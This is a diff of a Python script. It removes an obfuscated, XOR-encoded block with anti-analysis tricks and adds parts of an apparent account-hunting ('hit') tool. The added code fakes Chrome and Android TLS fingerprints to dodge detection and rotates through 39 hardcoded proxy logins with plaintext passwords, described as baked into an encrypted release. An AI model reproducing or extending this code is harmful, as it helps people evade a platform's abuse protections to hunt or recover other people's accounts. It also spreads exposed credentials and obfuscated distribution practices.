@@ -1,3793 +1,17261 @@
-# ════════════════════
-__ENC_AUTHOR__ = "DEVELOPYER"
-__TELEGRAM__ = "@Developyer"
-# ════════════════════
+import hashlib
+import platform
+import uuid
+import re
+import secrets
+import shutil
+import requests
+import threading
+import time
+import sys
+import os
+import html
+import json
+import base64
+import hmac
+import queue
+import random
+from concurrent.futures import ThreadPoolExecutor, TimeoutError as FuturesTimeoutError, as_completed
+from datetime import datetime, timezone, timedelta
+from urllib.parse import quote, urlparse
+from requests.adapters import HTTPAdapter
+from urllib3.util.retry import Retry
 
-вЗщШКЎЌЙЂщдоУ='ЪйІЏъаМох'
-def юАыЪГШГэЯШюгеез():
-    вЗщШКЎЌЙЂщдоУ='ЪйІЏъаМох'
-    гтьЬЏЫцдхзмКГУрИЙТЭ=__import__(''.join(chr(ЋДшБиЏЂЍЁЮЗЋБЏыкщ^ord(вЗщШКЎЌЙЂщдоУ[ЕХАюПЁБЮЕжЩЃТ%len(вЗщШКЎЌЙЂщдоУ)])) for ЕХАюПЁБЮЕжЩЃТ,ЋДшБиЏЂЍЁЮЗЋБЏыкщ in enumerate([1112, 1112, 1128, 1131, 1061, 1117])))
-    ЦНмЋувЊВфНдуОЊб=__import__(''.join(chr(ЋДшБиЏЂЍЁЮЗЋБЏыкщ^ord(вЗщШКЎЌЙЂщдоУ[ЕХАюПЁБЮЕжЩЃТ%len(вЗщШКЎЌЙЂщдоУ)])) for ЕХАюПЁБЮЕжЩЃТ,ЋДшБиЏЂЍЁЮЗЋБЏыкщ in enumerate([1118, 1104, 1131, 1130])))
-    ЙЂФощуЏЅПиШЩъчцхЍтЋ=__import__(''.join(chr(ЋДшБиЏЂЍЁЮЗЋБЏыкщ^ord(вЗщШКЎЌЙЂщдоУ[ЕХАюПЁБЮЕжЩЃТ%len(вЗщШКЎЌЙЂщдоУ)])) for ЕХАюПЁБЮЕжЩЃТ,ЋДшБиЏЂЍЁЮЗЋБЏыкщ in enumerate([1113, 1088, 1141])))
-    ЭсзьаУЁЫЉьщг=''.join(chr(ЋДшБиЏЂЍЁЮЗЋБЏыкщ^ord(вЗщШКЎЌЙЂщдоУ[ЕХАюПЁБЮЕжЩЃТ%len(вЗщШКЎЌЙЂщдоУ)])) for ЕХАюПЁБЮЕжЩЃТ,ЋДшБиЏЂЍЁЮЗЋБЏыкщ in enumerate([1134, 1116, 1136, 1130, 1062, 1119, 1132, 1095, 1056, 1112, 1049, 1137, 1134, 1060, 1092, 1135, 1054, 1073, 1093, 1049, 1135, 1121, 1068, 1119, 1134, 1107, 1125, 1107, 1110, 1139, 1071, 1086, 1112, 1149, 1098, 1125, 1107, 1110, 1139, 1071, 1067, 1090, 1145, 1054, 1074, 1103, 1112, 1133, 1071, 9310, 1040, 1125, 1105, 1072, 1034, 1105, 1127, 1145, 1071, 1040, 1136, 1115, 1078, 1113, 1049, 1124, 1149, 1067, 1113, 1138, 1054, 1062, 1103, 1109, 1130, 1148, 1124, 1070, 1096, 1110, 1068, 1113, 1049, 1142, 1134, 1065, 1115, 1145, 1100, 1125, 1097, 1110, 1141, 1147, 1081, 1040, 1137, 1105, 1079, 1103, 1049, 1124, 1149, 1067, 1113, 1138, 1054, 1062, 1103, 1109, 1130, 1148, 1130, 1092, 1140, 1119, 1067, 1034, 1088, 1129, 1146, 1130, 1112, 1149, 1096, 1056, 1028, 1063, 1119, 1120, 1087, 1040, 1137, 1111, 1078, 1113, 1116, 1122, 1071, 1086, 1112, 1145, 1054, 1078, 1089, 1104, 1130, 1123, 1081, 1052, 1084, 1109, 1068, 1102, 1117, 1129, 1057, 1108, 1150, 1139, 1054, 1064, 1099, 1111, 1128, 1121, 1060, 1118, 1084, 9258, 1125, 1114, 1100, 1138, 1071, 1086, 1112, 1145, 1054, 1069, 1103, 1089, 1062, 1130, 1070, 1113, 1128, 1105, 1079, 1034, 1117, 1129, 1144, 1060, 1054, 1026, 1146, 1024, 1148, 1148, 1098, 1088, 1050, 1129, 1113, 1132, 1125, 1113, 1112, 1151, 1148, 1136, 1040, 1147, 1105, 1125, 1094, 1116, 1127, 1149, 1060, 1040, 1100, 1095, 1073, 1090, 1110, 1128, 1071, 1068, 1113, 1134, 1101, 1073, 1030, 1049, 1138, 1127, 1071, 1118, 1084, 1117, 1066, 1095, 1116, 1062, 1133, 1067, 1107, 1143, 1040, 1115, 1139, 1110, 1139, 1149, 1130, 1143, 1140, 1111, 1057, 1112, 1112, 1062, 1129, 1061, 1116, 1144, 1115, 1079, 1034, 1114, 1127, 1123, 1062, 1109, 1144, 1054, 9297, 1034, 1104, 1138, 1064, 1081, 1040, 1145, 1107, 1063, 1099, 1099, 1140, 1134, 1081, 1091, 1145, 1114, 1125, 1100, 1110, 1140, 1071, 1075, 1119, 1129, 1040, 1115, 1132, 1099, 1135, 1131, 1067, 1040, 1139, 1104, 1125, 1107, 1110, 1139, 1149, 1130, 1088, 1140, 1105, 1067, 1103, 1049, 1137, 1120, 1060, 1047, 1128, 1054, 1078, 1099, 1103, 1123, 1071, 1086, 1112, 1141, 1101, 1125, 1114, 1116, 1140, 1148, 1061, 1118, 1149, 1106, 1068, 1118, 1088, 1064, 1041, 1043, 1119, 1129, 1054, 1078, 1118, 1099, 1135, 1151, 1082, 1109, 1144, 1054, 1073, 1090, 1116, 1062, 1127, 1071, 1105, 1144, 1115, 1079, 1034, 1109, 1135, 1124, 1071, 1040, 1125, 1105, 1072, 1034, 1098, 1138, 1149, 1059, 1088, 1084, 1114, 1068, 1101, 1111, 1135, 1147, 1075, 1054, 1026, 1132, 1056, 1116, 1116, 1140, 1148, 1071, 1040, 1131, 1110, 1060, 1118, 1030, 1062, 1110, 1061, 1093, 1084, 1117, 1060, 1092, 1054, 1138, 1071, 1071, 1094, 1145, 1104, 1125, 1100, 1110, 1140, 1144, 1067, 1090, 1144, 1040, 1115, 1126, 1116, 1141, 1148, 1130, 1116, 1139, 1113, 1068, 1097, 1045, 1062, 1122, 1061, 1090, 1145, 1054, 1062, 1093, 1097, 1135, 1146, 1063, 1040, 9224, 1054, 1062, 1094, 1112, 1141, 1148, 1059, 1107, 1074, 1056, 1041, 1099, 1108, 1142, 1130, 1080, 1040, 1144, 1115, 1073, 1103, 1114, 1138, 1130, 1070, 1054, 1084, 1147, 1058, 1093, 1049, 1122, 1130, 1062, 1109, 1128, 1115, 1057, 1028, 1063, 1106, 1127, 1059, 1091, 1084, 1101, 1062, 1112, 1104, 1142, 1147, 1130, 1113, 1135, 1054, 1077, 1112, 1110, 1138, 1130, 1065, 1092, 1145, 1114, 1125, 1096, 1088, 1062, 1103, 1038, 1109, 1130, 1115, 1065, 1093, 1097, 1151, 1130, 1080, 1040, 9224, 1054, 1084, 1093, 1100, 1057, 1149, 1071, 1040, 1138, 1105, 1073, 1028, 1063, 1103, 1121, 1068, 1113, 1138, 1111, 1073, 1103, 1049, 1130, 1120, 1061, 1088, 1084, 1099, 1067, 1094, 1110, 1125, 1124, 1071, 1108, 1062, 1054, 1060, 1097, 1105, 1135, 1130, 1084, 1109, 1137, 1115, 1067, 1118, 1049, 1057, 1116, 1065, 1090, 1141, 1102, 1073, 1034, 1138, 1135, 1131, 1070, 1113, 1145, 1049, 1131, 1076, 1120, 1129, 1146, 1080, 1040, 1117, 1133, 1041, 1034, 1102, 1127, 1123, 1057, 1040, 1140, 1119, 1078, 1034, 1101, 1134, 1130, 1130, 1109, 1138, 1115, 1079, 1101, 1088, 1062, 1120, 1068, 1040, 1149, 1054, 1065, 1093, 1098, 1138, 1071, 1086, 1119, 1129, 1100, 1068, 1113, 1101, 1064, 1041, 1032, 1105, 1135, 1115, 1149, 1055, 1049, 1135, 1148, 1060, 1047, 1128, 1054, 1060, 1034, 1097, 1123, 1149, 1081, 1119, 1138, 1119, 1065, 1091, 1101, 1151, 1071, 1086, 1090, 1149, 1111, 1073, 1028, 1063, 1118, 1088, 1048, 1040, 1141, 1101, 1067, 1037, 1101, 1062, 1127, 1067, 1090, 1144, 1054, 9297, 1034, 1088, 1129, 1146, 1080, 1040, 1136, 1111, 1059, 1103, 1049, 1125, 1127, 1061, 1113, 1151, 1115, 1078, 1034, 1112, 1140, 1130, 1124, 1070, 1100, 1115, 1056, 1094, 1049, 1129, 1121, 1071, 1040, 1136, 1119, 1084, 1103, 1099, 1066, 1071, 1065, 1090, 1125, 1054, 1059, 1093, 1099, 1062, 1148, 1059, 1096, 1084, 1107, 1066, 1112, 1116, 1064, 1041, 1043, 1119, 1129, 1054, 1074, 1099, 1111, 1138, 1130, 1070, 1040, 1135, 1105, 1072, 1112, 1114, 1123, 1071, 9310, 1040, 1140, 1115, 1079, 1103, 1054, 1141, 1071, 1059, 1118, 1146, 1111, 1067, 1091, 1101, 1123, 1071, 1082, 1090, 1141, 1104, 1073, 1113, 1049, 1135, 1121, 1081, 1092, 1145, 1119, 1057, 1028, 1063, 1092, 1149, 1067, 1113, 1138, 1054, 1062, 1103, 1109, 1130, 1148, 1136, 1040, 1064, 1038, 1137, 1034, 1143, 1129, 1147, 1130, 1142, 1139, 1099, 1067, 1102, 1047, 1048, 1099, 1071, 1094, 1145, 1106, 1066, 1114, 1088, 1123, 1149, 1130, 1113, 1135, 1054, 1067, 1093, 1101, 1062, 1116, 1054, 1141, 1109, 1136, 1125, 9278, 1049, 1151, 1120, 1087, 1047, 1134, 1115, 1125, 1113, 1101, 1135, 1123, 1062, 1040, 1150, 1105, 1073, 1090, 1049, 1130, 1120, 1081, 1113, 1138, 1113, 1131, 1076, 1134, 1123, 1134, 1057, 1040, 1149, 1098, 1073, 1103, 1108, 1142, 1147, 1124, 1040, 1103, 1098, 1079, 1093, 1111, 1121, 1130, 1080, 1040, 1151, 1105, 1059, 1100, 1116, 1123, 1071, 1080, 1109, 1151, 1105, 1064, 1095, 1116, 1128, 1131, 1071, 1108, 1074, 1056, 1041, 1090, 1116, 1062, 1120, 1060, 1116, 1125, 1054, 1073, 1090, 1104, 1128, 1128, 1130, 1097, 1139, 1099, 1125, 1102, 1116, 1125, 1149, 1075, 1088, 1128, 1115, 1057, 1034, 1104, 1141, 1071, 1063, 1097, 1084, 1102, 1060, 1118, 1104, 1123, 1121, 1065, 1109, 1074, 1056, 1038, 1103, 1116, 1142, 1071, 1069, 1119, 1141, 1104, 1058, 1034, 9261, 1062, 1147, 1058, 1109, 1084, 1106, 1066, 1093, 1097, 1062, 1123, 1061, 1094, 1145, 1101, 1125, 1097, 1110, 1131, 1151, 1067, 1118, 1125, 1040, 1115, 1122, 1110, 1128, 1130, 1081, 1092, 1084, 1119, 1072, 1102, 1104, 1138, 1077, 1130, 1097, 1139, 1099, 1125, 1094, 1110, 1141, 1130, 1124, 1040, 1103, 1119, 1075, 1099, 1118, 1123, 1071, 1067, 1093, 1144, 1111, 1073, 1040, 1049, 1151, 1120, 1087, 1040, 1138, 1115, 1075, 1103, 1099, 1062, 1127, 1067, 1108, 1084, 1119, 1125, 1097, 1105, 1127, 1121, 1065, 1109, 1074, 1056, 1030, 1093, 1111, 1138, 1134, 1065, 1092, 1084, 1150, 1025, 1103, 1103, 1123, 1123, 1061, 1088, 1125, 1115, 1079, 1034, 1102, 1134, 1130, 1060, 1040, 1125, 1105, 1072, 1034, 1118, 1140, 1120, 1085, 1040, 1149, 1054, 1078, 1089, 1104, 1130, 1123, 1130, 1092, 1134, 1115, 1056, 1028]))
-    ЈЌДеХЅпЩсрытДЩУЯсчИ=tuple(ЭсзьаУЁЫЉьщг.split('\x1e'))
-    while (1):
-        рьХуЅгВяаиЁЖЈХЁФАЫ=гтьЬЏЫцдхзмКГУрИЙТЭ.choice(ЈЌДеХЅпЩсрытДЩУЯсчИ)
-        print(''.join(chr(ЋДшБиЏЂЍЁЮЗЋБЏыкщ^ord(вЗщШКЎЌЙЂщдоУ[ЕХАюПЁБЮЕжЩЃТ%len(вЗщШКЎЌЙЂщдоУ)])) for ЕХАюПЁБЮЕжЩЃТ,ЋДшБиЏЂЍЁЮЗЋБЏыкщ in enumerate([1134, 1148, 1104, 1098, 1030, 1151, 1100, 1127, 1024, 1144, 1049, 1109, 1102, 1043, 1123])));print(''.join(chr(ЋДшБиЏЂЍЁЮЗЋБЏыкщ^ord(вЗщШКЎЌЙЂщдоУ[ЕХАюПЁБЮЕжЩЃТ%len(вЗщШКЎЌЙЂщдоУ)])) for ЕХАюПЁБЮЕжЩЃТ,ЋДшБиЏЂЍЁЮЗЋБЏыкщ in enumerate([1034, 1049, 1062, 1104, 1045, 1135, 1091, 1121, 1050, 1141, 1126, 1113, 1104, 1045, 1135, 1091, 1121, 1050, 1141, 1126, 1113, 1104, 1045, 1135, 1091, 1121, 1050])));print(''.join(chr(ЋДшБиЏЂЍЁЮЗЋБЏыкщ^ord(вЗщШКЎЌЙЂщдоУ[ЕХАюПЁБЮЕжЩЃТ%len(вЗщШКЎЌЙЂщдоУ)])) for ЕХАюПЁБЮЕжЩЃТ,ЋДшБиЏЂЍЁЮЗЋБЏыкщ in enumerate([1153]))+рьХуЅгВяаиЁЖЈХЁФАЫ+''.join(chr(ЋДшБиЏЂЍЁЮЗЋБЏыкщ^ord(вЗщШКЎЌЙЂщдоУ[ЕХАюПЁБЮЕжЩЃТ%len(вЗщШКЎЌЙЂщдоУ)])) for ЕХАюПЁБЮЕжЩЃТ,ЋДшБиЏЂЍЁЮЗЋБЏыкщ in enumerate([1169])));print(''.join(chr(ЋДшБиЏЂЍЁЮЗЋБЏыкщ^ord(вЗщШКЎЌЙЂщдоУ[ЕХАюПЁБЮЕжЩЃТ%len(вЗщШКЎЌЙЂщдоУ)])) for ЕХАюПЁБЮЕжЩЃТ,ЋДшБиЏЂЍЁЮЗЋБЏыкщ in enumerate([1130, 1149, 1123, 1145, 1071, 1116, 1139, 1102, 1084, 1103, 1099])));print(''.join(chr(ЋДшБиЏЂЍЁЮЗЋБЏыкщ^ord(вЗщШКЎЌЙЂщдоУ[ЕХАюПЁБЮЕжЩЃТ%len(вЗщШКЎЌЙЂщдоУ)])) for ЕХАюПЁБЮЕжЩЃТ,ЋДшБиЏЂЍЁЮЗЋБЏыкщ in enumerate([1141, 1126, 1113, 1104, 1045, 1135, 1091, 1121, 1050, 1141, 1126, 1113, 1104, 1045, 1135, 1091, 1121, 1050, 1141, 1126, 1113, 1104, 1045, 1135, 1091, 1121, 1050, 1141])))
-        ЦНмЋувЊВфНдуОЊб.sleep(0.35);ЙЂФощуЏЅПиШЩъчцхЍтЋ.stdout.flush()
-ШгЙЅчПЖЈАЖТцэЪ=__import__(''.join(chr(ЋДшБиЏЂЍЁЮЗЋБЏыкщ^ord(вЗщШКЎЌЙЂщдоУ[ЕХАюПЁБЮЕжЩЃТ%len(вЗщШКЎЌЙЂщдоУ)])) for ЕХАюПЁБЮЕжЩЃТ,ЋДшБиЏЂЍЁЮЗЋБЏыкщ in enumerate([1093, 1098])))
-if getattr(getattr(ШгЙЅчПЖЈАЖТцэЪ,'environ'),'get')(''.join(chr(ЋДшБиЏЂЍЁЮЗЋБЏыкщ^ord(вЗщШКЎЌЙЂщдоУ[ЕХАюПЁБЮЕжЩЃТ%len(вЗщШКЎЌЙЂщдоУ)])) for ЕХАюПЁБЮЕжЩЃТ,ЋДшБиЏЂЍЁЮЗЋБЏыкщ in enumerate([1134, 1148, 1104, 1098, 1030, 1151, 1100, 1127, 1024, 1144, 1126, 1095, 1115, 1054, 1137, 1119, 1141])))or getattr(getattr(ШгЙЅчПЖЈАЖТцэЪ,'environ'),'get')(''.join(chr(ЋДшБиЏЂЍЁЮЗЋБЏыкщ^ord(вЗщШКЎЌЙЂщдоУ[ЕХАюПЁБЮЕжЩЃТ%len(вЗщШКЎЌЙЂщдоУ)])) for ЕХАюПЁБЮЕжЩЃТ,ЋДшБиЏЂЍЁЮЗЋБЏыкщ in enumerate([1146, 1120, 1104, 1102, 1055, 1148, 1096, 1121, 1028, 1150, 1133, 1095, 1100, 1025]))):
-    юАыЪГШГэЯШюгеез()
-def фУОЋПйпХаЙоУЖ():
-    вЗщШКЎЌЙЂщдоУ='ЪйІЏъаМох'
-    ШгЙЅчПЖЈАЖТцэЪ=__import__(''.join(chr(ЋДшБиЏЂЍЁЮЗЋБЏыкщ^ord(вЗщШКЎЌЙЂщдоУ[ЕХАюПЁБЮЕжЩЃТ%len(вЗщШКЎЌЙЂщдоУ)])) for ЕХАюПЁБЮЕжЩЃТ,ЋДшБиЏЂЍЁЮЗЋБЏыкщ in enumerate([1093, 1098])))
-    фвсКРсяНЦРЩЧЯЎ=''.join(chr(ЋДшБиЏЂЍЁЮЗЋБЏыкщ^ord(вЗщШКЎЌЙЂщдоУ[ЕХАюПЁБЮЕжЩЃТ%len(вЗщШКЎЌЙЂщдоУ)])) for ЕХАюПЁБЮЕжЩЃТ,ЋДшБиЏЂЍЁЮЗЋБЏыкщ in enumerate([1033, 1049, 8534, 8543, 8474, 8544, 8524, 8558, 8469, 8570, 8553, 8534, 8543, 8474, 8544, 8524, 8558, 8469, 8570, 8553, 8534, 8543, 1088, 1135, 1091, 1147, 1035, 1129, 1126, 1095, 1114, 1054, 1144, 1107, 1132, 1050, 1141, 1049, 1083, 1071, 1128, 1140, 1113, 1128, 1024, 1126, 1142, 1110, 1110, 1039, 1122, 1086, 1076, 1050, 1141, 1133, 1091, 1091, 1039, 1143, 1102, 1151, 1032, 1141, 1126, 1062, 1074, 1130, 1042, 1116, 1146, 1056, 1116, 1116, 1130, 1120, 1082, 1097, 1145, 1100, 1127, 1056, 1050, 1062, 8543, 8474, 8544, 8524, 8558, 8469, 8570, 8553, 8534, 8543, 8474, 8544, 8524, 8558, 8469, 8570, 8553, 8534, 8543, 8474]))
+# Hit MORE: wbloks recovery (test.run_recovery) + legacy graphql helpers kept for other paths
+# HTTP chain for profile/posts: curl_cffi → tls_client → requests
+# tls_client .so often missing on Termux; curl_cffi chrome131_android works when installed.
+_curl_cffi_mod = None
+_HIT_LOOKUP_HAS_CURL = False
+_HIT_CURL_LABEL = ""
+_tls_client_mod = None
+_HIT_LOOKUP_HAS_TLS = False
+_HIT_TLS_LABEL = ""
+# Termux/mobile: Android TLS only — do not fall back to desktop chrome impersonate.
+_CURL_IMPERSONATE_MOBILE = ("chrome131_android", "chrome99_android")
+_CURL_IMPERSONATE_DESKTOP = ("chrome131", "chrome124", "chrome120")
+_TLS_MOBILE_IDS = ("okhttp4_android_13", "okhttp4_android_12", "okhttp4_android_11")
+_TLS_DESKTOP_IDS = ("chrome_120", "chrome_110", "okhttp4_android_13")
+
+
+def _tls_blocked_platform() -> bool:
+    # TERMUX_VERSION only — folder check false-positives on Linux hosts.
+    return bool(os.environ.get("TERMUX_VERSION"))
+
+
+def _is_mobile_hit_http() -> bool:
+    if os.environ.get("TERMUX_VERSION"):
+        return True
+    return "com.termux" in os.environ.get("PREFIX", "")
+
+
+def _bootstrap_curl_cffi() -> None:
+    """curl_cffi — Chrome/Android TLS fingerprint; best Termux option when wheel exists."""
+    global _curl_cffi_mod, _HIT_LOOKUP_HAS_CURL, _HIT_CURL_LABEL
     try:
-        ЁЎЭКЫЙКЫФфгЍЅм=getattr(getattr(ШгЙЅчПЖЈАЖТцэЪ,'path'),'abspath')(__file__)
-        ЩАЇБшУЍТЭДДтЁАбиж=open(ЁЎЭКЫЙКЫФфгЍЅм,'r',encoding='utf-8').read()
+        from curl_cffi import requests as curl_requests
+    except ImportError:
+        _curl_cffi_mod = None
+        _HIT_LOOKUP_HAS_CURL = False
+        _HIT_CURL_LABEL = ""
+        return
+    pool = _CURL_IMPERSONATE_MOBILE if _is_mobile_hit_http() else _CURL_IMPERSONATE_DESKTOP
+    for imp in pool:
+        try:
+            probe = curl_requests.Session(impersonate=imp)
+            del probe
+            _curl_cffi_mod = curl_requests
+            _HIT_LOOKUP_HAS_CURL = True
+            _HIT_CURL_LABEL = imp
+            return
+        except Exception:
+            continue
+    _curl_cffi_mod = None
+    _HIT_LOOKUP_HAS_CURL = False
+    _HIT_CURL_LABEL = ""
+
+
+def hit_http_stack_label() -> str:
+    """Active profile-fetch HTTP stack (for logs / system check)."""
+    if _HIT_LOOKUP_HAS_CURL and _HIT_CURL_LABEL:
+        return f"curl_cffi/{_HIT_CURL_LABEL}"
+    if _HIT_LOOKUP_HAS_TLS and _HIT_TLS_LABEL:
+        return f"tls_client/{_HIT_TLS_LABEL}"
+    return "requests"
+
+
+def _bootstrap_tls_client() -> None:
+    """tls_client OkHttp fingerprint — desktop only; broken .so on Termux."""
+    global _tls_client_mod, _HIT_LOOKUP_HAS_TLS, _HIT_TLS_LABEL
+    if _is_mobile_hit_http():
+        return
+    pool = _TLS_MOBILE_IDS if _is_mobile_hit_http() else _TLS_DESKTOP_IDS
+    try:
+        import tls_client as tc
+    except ImportError:
+        _tls_client_mod = None
+        _HIT_LOOKUP_HAS_TLS = False
+        _HIT_TLS_LABEL = ""
+        return
+    for cid in pool:
+        try:
+            probe = tc.Session(client_identifier=cid, random_tls_extension_order=True)
+            del probe
+            _tls_client_mod = tc
+            _HIT_LOOKUP_HAS_TLS = True
+            _HIT_TLS_LABEL = cid
+            return
+        except Exception:
+            continue
+    _tls_client_mod = None
+    _HIT_LOOKUP_HAS_TLS = False
+    _HIT_TLS_LABEL = ""
+
+
+def _bootstrap_hit_http() -> None:
+    _bootstrap_curl_cffi()
+    _bootstrap_tls_client()
+
+
+_bootstrap_hit_http_lock = threading.Lock()
+_bootstrap_hit_http_done = False
+
+
+def _ensure_hit_http_bootstrapped() -> None:
+    """Lazy TLS stack probe — avoids blocking joint.py import on curl_cffi/tls_client."""
+    global _bootstrap_hit_http_done
+    if _bootstrap_hit_http_done:
+        return
+    with _bootstrap_hit_http_lock:
+        if _bootstrap_hit_http_done:
+            return
+        _bootstrap_hit_http()
+        _bootstrap_hit_http_done = True
+
+
+def _new_hit_http_session() -> tuple[object, str]:
+    _ensure_hit_http_bootstrapped()
+    """(session, backend) — backend: curl_cffi | tls_client | requests."""
+    if _HIT_LOOKUP_HAS_CURL and _curl_cffi_mod is not None and _HIT_CURL_LABEL:
+        try:
+            return _curl_cffi_mod.Session(impersonate=_HIT_CURL_LABEL), "curl_cffi"
+        except Exception:
+            pass
+    if _HIT_LOOKUP_HAS_TLS and _tls_client_mod is not None:
+        try:
+            return _tls_client_mod.Session(
+                client_identifier=_HIT_TLS_LABEL or "okhttp4_android_13",
+                random_tls_extension_order=True,
+            ), "tls_client"
+        except Exception:
+            pass
+    return requests.Session(), "requests"
+
+
+def _new_hit_tls_session() -> tuple[object, bool]:
+    """Legacy (session, is_tls_client) — profile code uses _new_hit_http_session."""
+    http, backend = _new_hit_http_session()
+    return http, backend == "tls_client"
+
+
+def _hit_http_post(
+    http, backend, url, *, data, headers, timeout: int = 30, proxies=None,
+):
+    hdrs = dict(headers or {})
+    if backend == "tls_client":
+        try:
+            return http.post(
+                url, data=data, headers=hdrs, timeout_seconds=timeout, proxies=proxies,
+            )
+        except TypeError:
+            pass
+    return http.post(url, data=data, headers=hdrs, timeout=timeout, proxies=proxies)
+
+
+def _hit_http_get(
+    http, backend, url, *, params=None, headers=None, timeout: int = 20, proxies=None,
+):
+    hdrs = dict(headers or {})
+    if backend == "tls_client":
+        try:
+            return http.get(
+                url, params=params, headers=hdrs, timeout_seconds=timeout, proxies=proxies,
+            )
+        except TypeError:
+            pass
+    return http.get(url, params=params, headers=hdrs, timeout=timeout, proxies=proxies)
+
+
+# ═══ Hit enrich proxies (hardcoded — recovery / posts / profile only) ═══
+# Not shipped as proxy_live.txt — baked into encrypted release.
+# 39 proxies · hunt gen uses direct IP only
+_HIT_PROXIES_RAW = (
+    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@pt-lis.pvdata.host:8080",
+    "hughmuir2:lisamarie11@us6.cactussstp.com:81",
+    "bvmbsmie:shibby2511@nl3.cactussstp.com:8080",
+    "yefprelf:dr2gsmab@nl3.cactussstp.com:8080",
+    "uncpjndo:w77Ebc0h2A@nl3.cactussstp.com:81",
+    "bvmbsmie:shibby2511@us6.cactussstp.com:81",
+    "uncpjndo:w77Ebc0h2A@nl3.cactussstp.com:3129",
+    "nngone:Oe2933Oe@nl3.cactussstp.com:3129",
+    "hughmuir2:lisamarie11@nl3.cactussstp.com:81",
+    "bvmbsmie:shibby2511@nl3.cactussstp.com:3129",
+    "yefprelf:dr2gsmab@nl3.cactussstp.com:3129",
+    "bvmbsmie:shibby2511@nl3.cactussstp.com:81",
+    "hughmuir2:lisamarie11@nl3.cactussstp.com:8080",
+    "nngone:Oe2933Oe@nl3.cactussstp.com:81",
+    "uncpjndo:w77Ebc0h2A@nl3.cactussstp.com:8080",
+    "hughmuir2:lisamarie11@nl3.cactussstp.com:3129",
+    "yefprelf:dr2gsmab@nl3.cactussstp.com:81",
+    "uncpjndo:w77Ebc0h2A@us6.cactussstp.com:81",
+    "nngone:Oe2933Oe@us6.cactussstp.com:81",
+    "bvmbsmie:shibby2511@us6.cactussstp.com:8080",
+    "hughmuir2:lisamarie11@us6.cactussstp.com:8080",
+    "uncpjndo:w77Ebc0h2A@us6.cactussstp.com:3129",
+    "nngone:Oe2933Oe@nl3.cactussstp.com:8080",
+    "hughmuir2:lisamarie11@us6.cactussstp.com:3129",
+    "nngone:Oe2933Oe@us6.cactussstp.com:3129",
+    "bvmbsmie:shibby2511@us6.cactussstp.com:3129",
+    "nngone:Oe2933Oe@us6.cactussstp.com:8080",
+    "uncpjndo:w77Ebc0h2A@us6.cactussstp.com:8080",
+    "uncpjndo:w77Ebc0h2A@us3.cactussstp.com:3129",
+    "uncpjndo:w77Ebc0h2A@us3.cactussstp.com:81",
+    "uncpjndo:w77Ebc0h2A@us3.cactussstp.com:8080",
+    "bvmbsmie:shibby2511@us3.cactussstp.com:8080",
+    "nngone:Oe2933Oe@us3.cactussstp.com:81",
+    "bvmbsmie:shibby2511@us3.cactussstp.com:3129",
+    "nngone:Oe2933Oe@us3.cactussstp.com:8080",
+    "hughmuir2:lisamarie11@us3.cactussstp.com:8080",
+    "hughmuir2:lisamarie11@us3.cactussstp.com:81",
+    "bvmbsmie:shibby2511@us3.cactussstp.com:81",
+    "hughmuir2:lisamarie11@us3.cactussstp.com:3129",
+)
+_hit_proxy_pool = None
+_hit_proxy_pool_lock = threading.Lock()
+
+def _parse_hit_proxy_line(line):
+    raw = (line or "").strip()
+    if not raw or raw.startswith("#"):
+        return None
+    if "@" in raw:
+        creds, hostport = raw.rsplit("@", 1)
+        if ":" not in creds or ":" not in hostport:
+            return None
+        username, password = creds.split(":", 1)
+        host, port = hostport.rsplit(":", 1)
+    else:
+        parts = raw.split(":")
+        if len(parts) < 4:
+            return None
+        host, port, username, *rest = parts
+        password = ":".join(rest)
+    if not all((host, port, username, password)):
+        return None
+    proxy_url = f"http://{username}:{password}@{host}:{port}"
+    return {
+        "http": proxy_url,
+        "https": proxy_url,
+        "raw": raw,
+        "label": f"{host}:{port}",
+    }
+
+
+def _hit_proxy_for_requests(entry):
+    if not entry:
+        return None
+    return {"http": entry["http"], "https": entry["https"]}
+
+
+class _HitProxyPool:
+    _STRIKE_LIMIT = 1
+
+    def __init__(self, proxies):
+        self._proxies = list(proxies)
+        random.shuffle(self._proxies)
+        self._idx = 0
+        self._strikes = {}
+        self._lock = threading.Lock()
+
+    def __len__(self):
+        return len(self._proxies)
+
+    def mark_bad_requests(self, proxies):
+        if not proxies:
+            return
+        bad = proxies.get("https") or proxies.get("http")
+        if not bad:
+            return
+        with self._lock:
+            self._strikes[bad] = self._strikes.get(bad, 0) + 1
+            if self._strikes[bad] < self._STRIKE_LIMIT:
+                return
+            self._proxies = [
+                p for p in self._proxies if (p.get("https") or p.get("http")) != bad
+            ]
+            self._strikes.pop(bad, None)
+            if self._idx >= len(self._proxies):
+                self._idx = 0
+
+    def next_requests(self):
+        with self._lock:
+            if not self._proxies:
+                return None
+            entry = self._proxies[self._idx % len(self._proxies)]
+            self._idx += 1
+            return _hit_proxy_for_requests(entry)
+
+
+def _load_hit_proxy_pool():
+    entries = []
+    for line in _HIT_PROXIES_RAW:
+        entry = _parse_hit_proxy_line(line)
+        if entry:
+            entries.append(entry)
+    return _HitProxyPool(entries)
+
+
+def get_hit_proxy_pool():
+    global _hit_proxy_pool
+    with _hit_proxy_pool_lock:
+        if _hit_proxy_pool is None:
+            _hit_proxy_pool = _load_hit_proxy_pool()
+        return _hit_proxy_pool
+
+
+def hit_proxy_next():
+    pool = get_hit_proxy_pool()
+    if not pool:
+        return None
+    return pool.next_requests()
+
+
+def hit_proxy_mark_bad(proxies):
+    pool = get_hit_proxy_pool()
+    if pool:
+        pool.mark_bad_requests(proxies)
+
+
+def _hit_proxy_attempts(*, proxy_tries=None, direct_first=True):
+    """Own IP first, then hardcoded hit proxies — recovery/posts/profile only."""
+    if direct_first:
+        yield None
+    pool = get_hit_proxy_pool()
+    if not pool or len(pool) <= 0:
+        if not direct_first:
+            yield None
+        return
+    tries = max(1, int(proxy_tries if proxy_tries is not None else _HIT_RECOVERY_PROXY_TRIES))
+    for _ in range(tries):
+        proxies = pool.next_requests()
+        if proxies:
+            yield proxies
+    if not direct_first:
+        yield None
+
+
+def _hit_http_status_proxy_retry(status):
+    return int(status or 0) in (429, 502, 503, 504)
+
+
+
+def _hit_proxy_retry_pause(attempt_idx):
+    if attempt_idx <= 0:
+        return
+    if _IS_TERMUX:
+        time.sleep(0.35 + random.uniform(0.15, 0.55))
+    else:
+        time.sleep(0.12 + random.uniform(0.05, 0.25))
+
+
+_HIT_PROXY_TRIES = 10
+_HIT_LOOKUP_RETRIES = 10
+_HIT_LOOKUP_RETRY_DELAY = 2.5
+_HIT_CONTACT_ENRICH_RETRIES = 1
+_HIT_RECOVERY_PROXY_TRIES = 10
